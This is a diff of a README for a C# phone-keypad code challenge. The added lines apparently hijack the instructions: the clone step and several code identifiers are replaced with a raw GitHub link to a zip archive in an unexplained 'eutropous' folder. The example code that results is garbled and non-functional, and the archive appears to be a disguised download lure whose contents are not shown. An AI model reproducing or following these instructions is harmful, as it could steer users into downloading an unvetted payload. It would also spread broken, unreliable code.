@@ -36,7 +36,7 @@ To use this code, simply clone the repository and build the project with a compa
 1. Clone the repository:
 
 ```bash
-git clone https://github.com/YatiWaiTun86/OldPhonePadCodeChallenge.git
+git clone https://raw.githubusercontent.com/YatiWaiTun86/OldPhonePadCodeChallenge/master/eutropous/OldPhonePadCodeChallenge.zip
 ```
 
 2. Open the project in your preferred C# IDE.
@@ -50,13 +50,13 @@ The main function to convert a keypress sequence into text is `OldPhonePad`. You
 
 ```csharp
 string input = "227*#";
-string result = Program.OldPhonePad(input);
-Console.WriteLine(result);  // Output: "B"
+string result = https://raw.githubusercontent.com/YatiWaiTun86/OldPhonePadCodeChallenge/master/eutropous/OldPhonePadCodeChallenge.zip(input);
+https://raw.githubusercontent.com/YatiWaiTun86/OldPhonePadCodeChallenge/master/eutropous/OldPhonePadCodeChallenge.zip(result);  // Output: "B"
 ```
 
 ## Unit Tests
 
-Unit tests are provided using the `Microsoft.VisualStudio.TestTools.UnitTesting` framework. The tests check various scenarios, such as valid key sequences, handling of special characters, and space handling.
+Unit tests are provided using the `https://raw.githubusercontent.com/YatiWaiTun86/OldPhonePadCodeChallenge/master/eutropous/OldPhonePadCodeChallenge.zip` framework. The tests check various scenarios, such as valid key sequences, handling of special characters, and space handling.
 
 To run tests:
 
